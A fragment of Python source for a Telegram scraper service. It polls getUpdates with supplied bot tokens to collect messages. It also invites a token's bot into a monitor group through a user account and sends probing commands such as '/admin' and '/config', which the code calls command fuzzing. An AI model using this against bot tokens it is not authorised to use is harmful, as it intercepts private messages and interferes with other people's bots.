                            "telegram_msg_id": target.get("message_id"),
                            "sender_name": (
                                target.get("from", {}).get("username")
                                or target.get("from", {}).get("first_name")
                                or "Unknown"
                            ),
                            "content": target.get("text") or target.get("caption") or "",
                            "media_type": media_type,
                            "file_meta": file_meta,
                        })
                    if updates:
                        meta_dict["last_live_seen_at"] = datetime.now(UTC).isoformat()
                    if last_update_id is not None:
                        meta_dict["last_update_id"] = last_update_id
                    meta_dict["last_live_failure_reason"] = None
                elif resp.status_code == 409:
                    logger.warning("    ⚠️ [Preflight] getUpdates 409 — webhook conflict")
                    meta_dict["last_live_failure_reason"] = ScrapeReason.WEBHOOK_CONFLICT.value
                elif resp.status_code == 429:
                    logger.warning("    ⚠️ [Preflight] getUpdates 429 — rate limited")
                    meta_dict["last_live_failure_reason"] = ScrapeReason.FLOOD_WAIT.value
                elif resp.status_code == 401:
                    return ([], {}, True)
                else:
                    logger.info(f"    ℹ️ [Preflight] getUpdates HTTP {resp.status_code}")
                    reason, _retryable = self.classifier._reason_from_exception(
                        Exception(f"HTTP {resp.status_code}")
                    )
                    meta_dict["last_live_failure_reason"] = reason.value

            return (formatted_updates, meta_dict, False)
        except Exception as e:
            logger.error(f"❌ [Scraper] Preflight check error: {e}")
            return ([], {}, False)

    async def _kickstart_bot(self, bot_token: str) -> int:
        """
        Invites the bot to the Monitor Group and sends commands to generate a Service Message / Update.
        Returns the new 'anchor' message ID if successful, else 0.
        """
        if self.is_monitor_bot(bot_token):
            logger.warning("    ⏭️ [Scraper] Skipping kickstart for the Monitor Bot itself.")
            return 0

        logger.info("💤 [Scraper] Initiating Kickstart...")
        anchor_id = 0
        try:
            from app.services.user_agent_srv import user_agent
            # 1. Get Username (needed for invite)
            bot_username = "unknown"
            async with httpx.AsyncClient() as client:
                me_res = await client.get(
                    f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5
                )
                if me_res.status_code == 200:
                    data = me_res.json()
                    if data.get("ok"):
                        bot_username = data["result"]["username"]

            # 2. Invite to Group (Creates a Service Message -> New ID!)
            dest = settings.MONITOR_GROUP_ID
            if dest and bot_username != "unknown":
                from app.core.redis_srv import redis_srv

                if redis_srv.is_on_cooldown("user_agent"):
                    ttl = redis_srv.get_cooldown_remaining("user_agent")
                    logger.warning(
                        f"    ⏳ [Scraper] Skipping Kickstart: UserAgent is on cooldown ({ttl}s left)."
                    )
                    return 0

                logger.info(
                    f"    ⚡ [Scraper] Kickstarting: Inviting @{bot_username} to monitor group..."
                )
                if await user_agent.invite_bot_to_group(bot_username, dest):
                    logger.info("    ⏳ [Scraper] Invite sent. Starting Command Fuzzing...")

                    # === TRIGGER COMMAND FUZZING ===
                    params = ["/start", "/help", "/admin", "/config", "dashboard"]
                    for cmd in params:
                        await user_agent.send_message(dest, cmd)
                        await asyncio.sleep(1.5)  # Pace out commands

                    logger.info("    ⏳ [Scraper] Fuzzing complete. Waiting for bot response...")
                    await asyncio.sleep(5)
                    # ===============================

                    # 3. Re-Poll Updates
                    retry_msgs = await self._scrape_via_bot_api(bot_token)
                    for m in retry_msgs:
                        if m["telegram_msg_id"] > anchor_id:
                            anchor_id = m["telegram_msg_id"]

                    if anchor_id > 0:
                        logger.info(
                            f"    ✅ [Scraper] Kickstart successful! New Anchor ID: {anchor_id}"
                        )
                    else:
                        logger.warning("    ❌ [Scraper] Kickstart failed (No update received).")
        except Exception as e:
            logger.error(f"    ⚠️ [Scraper] Kickstart error: {e}")

        return anchor_id

scraper_service = ScraperService()
